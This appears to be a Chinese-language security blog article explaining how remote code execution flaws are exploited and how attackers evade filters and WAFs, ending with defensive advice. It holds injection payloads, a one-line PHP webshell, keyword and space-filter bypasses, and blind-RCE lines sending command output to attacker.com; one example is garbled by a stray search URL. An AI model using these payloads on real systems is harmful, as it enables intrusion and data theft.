#  RCE 漏洞(下)：绕过防御，直达核心的艺术与科学  
原创 网安布道师  格格巫和蓝精灵   2025-07-07 04:31  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/9qM7NQ3lGkDicoYF5ltBPOk022Y584pKnNt23E3rpiaI4icSXAiaX2mKa8cUYK3CO4oJB7zIwjWiaDOXkOibpics6MqHA/640?wx_fmt=jpeg&from=appmsg "")  
  
在上一篇文章中，我们深入探讨了**远程代码执行 (RCE)**  
 漏洞的原理和危害。然而，安全攻防是一个动态博弈的过程。攻击者们总在寻找新的方式来利用漏洞，而防御者则不断升级防护。RCE 漏洞的利用往往并非一帆风顺，各种安全机制如 WAF (Web Application Firewall)、输入过滤、黑名单等会阻碍攻击。  
  
这篇文章，我们将揭示常见的 RCE **利用方式**  
以及攻击者们用来**绕过防御**  
的“奇技淫巧”，希望能帮助大家更好地理解和构建更健壮的安全防线。  
### 一、RCE 漏洞的常见利用方式  
  
RCE 的最终目标是在目标系统上执行任意代码，但实现这一目标的方法多种多样，取决于具体漏洞类型和目标环境。  
### 1. 命令注入的直接利用  
  
这是最直观的 RCE 利用方式，通常发生在应用程序直接拼接用户输入到系统命令中，且未对特殊字符进行充分过滤时。  
  
•**Linux/Unix 系统：**  
  
•**命令连接符：**  
  
•&&  
：cmd1 && cmd2  
 (cmd1 成功才执行 cmd2)  
•||  
：cmd1 || cmd2  
 (cmd1 失败才执行 cmd2)  
•;  
：cmd1 ; cmd2  
 (无论 cmd1 结果如何都执行 cmd2)  
•|  
：cmd1 | cmd2  
 (cmd1 的输出作为 cmd2 的输入)  
•`cmd`  
：(反引号执行命令并将其输出作为另一个命令的参数)  
•$(cmd)  
：(与反引号类似，更推荐的写法)  
  
•**示例：**  
 原命令 ping -c 4 $ip  
•  
注入 127.0.0.1; ls -al /  
•  
注入 127.0.0.1 && id  
•  
注入 127.0.0.1 | whoami  
  
•**Windows 系统：**  
•**命令连接符：**  
 &  
, &&  
, ||  
, |  
, ^  
 (脱字符用于转义特殊字符)  
•**示例：**  
 原命令 ping $ip  
  
•  
注入 127.0.0.1 & dir c:\  
•  
注入 127.0.0.1 || whoami  
### 2. 代码注入的直接利用  
  
当应用程序通过 eval()  
、exec()  
 等函数将用户输入作为代码执行时，攻击者可以直接注入目标语言的代码。  
  
•**PHP：**  
  
•  
注入 phpinfo();  
 查看环境信息。  
•  
注入 system('ls -al /');  
 执行系统命令。  
•  
写入 WebShell：file_put_contents('shell.php', '<?php eval($_POST[cmd]); ?>');  
  
•**Python：**  
•  
注入 __import__('os').system('ls -al /')  
  
•**JavaScript (Node.js 后端)：**  
•  
注入 require('child_process').execSync('id').toString()  
### 3. 反序列化漏洞的利用链 (Gadget Chains)  
  
反序列化漏洞的利用并非直接注入代码，而是构造恶意的序列化数据，利用应用程序中存在的“**小工具链 (Gadget Chains)**  
”——即一系列在反序列化过程中会被自动调用或触发的方法或函数调用路径——最终达到执行任意代码的目的。这通常需要深入了解目标应用程序或其依赖库的源代码。  
  
•**常见的 Gadget Chain 发现：**  
 通常依赖于对流行框架和库的审计，如 Java 的 Apache Commons Collections、Fastjson，PHP 的 Guzzle、Monolog，.NET 的 TypeConfuseDelegate 等。  
•**利用工具：**  
 如 Java 的 Ysoserial、PHP 的 PHPGGC，这些工具预置了常见的 Gadget Chain。  
### 4. WebShell 植入与管理  
  
成功利用 RCE 漏洞后，攻击者通常会做的第一件事就是植入一个 **WebShell**  
。这是一个用 Web 脚本语言（如 PHP、ASP、JSP）编写的后门文件，它允许攻击者通过 HTTP 请求来执行任意命令、上传下载文件、管理数据库等，从而获得持久化的控制权。  
  
•**利用步骤：**  
  
1.  
通过 RCE 漏洞写入 WebShell 文件（例如，使用 echo  
 命令、文件操作函数）。  
2.  
通过 Web 浏览器访问该 WebShell。  
3.  
通过 WebShell 提供的界面或参数，远程执行命令。  
  
•**常见功能：**  
 文件管理、命令执行、数据库操作、端口扫描、内网穿透。  
  
### 二、RCE 漏洞的常见绕过方式  
  
防御者部署了 WAF、输入过滤和黑名单等机制来阻止 RCE 攻击。但攻击者们也开发了各种绕过技术。  
### 1. 空格绕过  
  
某些过滤器会直接过滤空格，但命令执行中还有其他分隔符。  
  
•**替换空格：**  
  
•$IFS  
 (Linux/Unix 系统内置环境变量，表示内部字段分隔符)  
•${IFS}  
•${IFS}$9  
 (结合位置参数，有时可绕过对 $IFS  
 的直接过滤)  
•<  
, >  
, ,  
 (输入/输出重定向、逗号在某些场景下可代替空格)  
•%09  
 (Tab 键的 URL 编码)  
  
•**示例：**  
 cat /etc/passwd  
 可能被过滤，但 cat$IFS/etc/passwd  
 或 cat</etc/passwd  
 可能绕过。  
  
### 2. 黑名单关键字绕过  
  
当防御者列出了一系列“危险”关键字（如 system  
, exec  
, eval  
, phpinfo  
, cat  
, ls  
 等）并进行过滤时。  
  
•**大小写混淆：**  
 SysTeM  
, ExEc  
•**编码：**  
 URL 编码、HTML 实体编码、Base64 编码等。  
  
•%73%79%73%74%65%6d  
 (system 的 URL 编码)  
•&#x73;&#x79;&#x73;&#x74;&#x65;&#x6d;  
 (system 的 HTML 实体编码)  
  
•**字符串拼接/拆分：**  
 将关键字拆分成多个部分，再拼接起来。  
•'s'.'y'.'s'.'t'.'e'.'m'  
 (PHP 字符串拼接)  
  
•**反斜杠和引号转义：**  
 利用 PHP 等语言中对字符串解析的特性。  
•sy\stem  
•sy'stem'  
 (单引号)  
•sy"stem"  
 (双引号)  
  
•**通配符：**  
 在命令注入中，利用 *  
, ?  
 等通配符代替命令或文件名中的字符。  
•ca? /et?/?asswd  
•s*m 'ls -al /'  
 (如果 system  
 是唯一匹配的函数)  
  
•**变量替换：**  
 将危险字符串存储在变量中，再引用变量。  
•$a='sy';$b='stem';$a.$b('ls -al /');  
 (PHP)  
### 3. 无回显 RCE 的利用（Blind RCE）  
  
有时 RCE 成功执行了命令，但应用程序没有将命令的输出返回给攻击者。这被称为无回显 RCE 或盲 RCE。  
  
•**带外通信 (Out-of-Band, OOB)：**  
  
•**DNS 请求：**  
 让目标服务器发起 DNS 查询到攻击者控制的域名，域名中包含命令执行的结果。  
  
•ping -c 1 \  
whoami`  
https://www.google.com/search?q=.attacker.com`[1]  
(将whoami\  
 的结果作为子域名)  
  
•**HTTP/HTTPS 请求：**  
 让目标服务器发起 HTTP/HTTPS 请求到攻击者控制的服务器，并将命令执行结果通过请求参数或 Body 发送回去。  
•curl http://attacker.com/?result=\  
whoami``  
  
•**其他协议：**  
 FTP, SMTP 等。  
  
  
•**延时注入 (Time-based Blind RCE)：**  
 根据命令执行的时间延迟来判断命令是否成功执行。  
•sleep 5  
 或 ping -c 5 127.0.0.1  
•  
结合条件语句：if [ "$(id -u)" -eq 0 ]; then sleep 5; fi  
 (如果用户是 root 则延迟 5 秒)  
  
•**写入文件：**  
 将命令执行结果写入服务器上的某个文件，然后通过 Web 访问该文件。  
•ls -al / > /var/www/html/result.txt  
### 4. WAF 绕过  
  
Web 应用防火墙会尝试识别恶意请求模式并进行拦截。  
  
•**编码混淆：**  
 WAF 可能只识别常见编码。尝试双重 URL 编码、Unicode 编码、不常见字符编码。  
•**请求分块 (Chunked Encoding)：**  
 将请求体分成多个块发送，可能绕过 WAF 的整体扫描。  
•**HTTP 参数污染 (HPP)：**  
 发送多个同名参数，利用后端框架对参数解析差异。  
  
•?cmd=ls&cmd=-al  
  
•**HTTP 方法绕过：**  
 尝试使用非标准的 HTTP 方法（如 PUT  
, DELETE  
）或混淆方法。  
•**垃圾数据填充：**  
 在请求中添加大量无意义的字符，可能使 WAF 规则失效或超过其扫描范围。  
•**利用协议特性：**  
 如 HTTP/2 的某些特性可能绕过只针对 HTTP/1.1 的 WAF。  
•**CDN/反向代理配置错误：**  
 如果 WAF 部署在 CDN 或其他反向代理之后，可能存在绕过 WAF 直接访问源站的路径。  
### 5. 绕过特定函数限制  
  
当某些危险函数被禁用时。  
  
•**替代函数/方法：**  
  
•  
PHP 中 system()  
, exec()  
, shell_exec()  
 被禁用，可能尝试 passthru()  
, proc_open()  
, pcntl_exec()  
, backticks  
 (``  
)。  
•  
利用 PHP 的 mail()  
 函数，如果配置不当，可以通过邮件参数注入命令。  
•  
利用 dl()  
 函数动态加载 PHP 扩展来执行系统命令。  
  
•**环境变量绕过：**  
 有些 PHP 环境允许通过 LD_PRELOAD  
 或 putenv()  
 等方式劫持函数。  
•**文件上传结合文件包含：**  
 上传一个 .user.ini  
 或 .htaccess  
 文件修改 PHP 配置，允许执行危险函数。  
  
### 三、防御 RCE 漏洞的进阶思考  
  
理解攻击者如何利用和绕过 RCE 漏洞，对于构建更坚固的防御至关重要。  
  
1.**纵深防御：**  
 不仅仅依赖单一的防御机制。WAF 是第一道防线，但应用层自身的安全代码才是根本。  
2.**默认拒绝原则：**  
 所有输入都应被视为恶意，除非有明确的白名单规则证明其无害。  
3.**多层过滤与转义：**  
 在数据进入应用程序的各个层级（例如，网络层、解析层、业务逻辑层）都进行验证和过滤。  
4.**安全沙箱与最小权限：**  
  
•  
隔离用户可控代码的执行环境。  
•  
以最低权限运行服务，限制其对敏感文件、目录和系统命令的访问。  
  
   5.  代码审计与安全测试：  
•  
定期进行代码审查，特别关注对用户输入处理、文件操作、命令执行和反序列化操作的代码。  
•  
运用黑盒（如渗透测试）和白盒（如 SAST 静态应用安全测试）工具。  
  
   6.持续监控与日志分析：  
 监控异常的系统命令执行、不常见的文件写入、异常的网络连接等。对 sudo  
、系统调用日志进行深入分析。  
   7.及时更新与漏洞管理：  
 保持所有软件和库的最新状态，并建立完善的漏洞响应机制。  
### 结语  
  
RCE 漏洞的利用和绕过是一个不断演进的猫鼠游戏。攻击者们技艺高超，防御者们任重道远。作为安全从业者或系统管理者，我们不能满足于表面的防御。深入理解 RCE 漏洞的利用链、绕过技巧，才能构筑出真正强大、能够抵御复杂攻击的防御体系。愿我们都能成为这场博弈中的胜利者！  
  
  
